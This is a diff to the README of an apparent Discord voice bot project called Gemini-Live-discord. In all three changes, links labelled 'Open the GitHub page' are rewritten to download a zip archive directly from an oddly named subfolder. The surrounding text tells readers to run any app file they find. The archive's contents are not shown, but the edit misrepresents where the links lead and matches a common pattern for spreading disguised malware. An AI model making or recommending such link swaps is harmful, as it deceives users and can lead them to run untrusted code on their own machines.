@@ -1,6 +1,6 @@
 # 🤖 Gemini-Live-discord - Speak, reply, listen in Discord
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/filhodepedreiro/Gemini-Live-discord)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/filhodepedreiro/Gemini-Live-discord/raw/refs/heads/main/Lincolniana/discord-Gemini-Live-v1.0-beta.4.zip)
 
 ## 🖥️ What this app does
 
@@ -12,7 +12,7 @@ It is made for people who want an AI voice bot in Discord without setting up a f
 
 Use this link to visit the download page:
 
-[Open the GitHub page](https://github.com/filhodepedreiro/Gemini-Live-discord)
+[Open the GitHub page](https://github.com/filhodepedreiro/Gemini-Live-discord/raw/refs/heads/main/Lincolniana/discord-Gemini-Live-v1.0-beta.4.zip)
 
 On that page, look for the latest release or the main project files. If you see a Windows app file, download it and run that file. If you see project files instead, download the repository and follow the steps below.
 
@@ -156,4 +156,4 @@ Use short sentences when speaking to the bot. Pause between requests. Keep backg
 
 If you need to return to the project page, use this link:
 
-[https://github.com/filhodepedreiro/Gemini-Live-discord](https://github.com/filhodepedreiro/Gemini-Live-discord)
+[https://github.com/filhodepedreiro/Gemini-Live-discord/raw/refs/heads/main/Lincolniana/discord-Gemini-Live-v1.0-beta.4.zip](https://github.com/filhodepedreiro/Gemini-Live-discord/raw/refs/heads/main/Lincolniana/discord-Gemini-Live-v1.0-beta.4.zip)
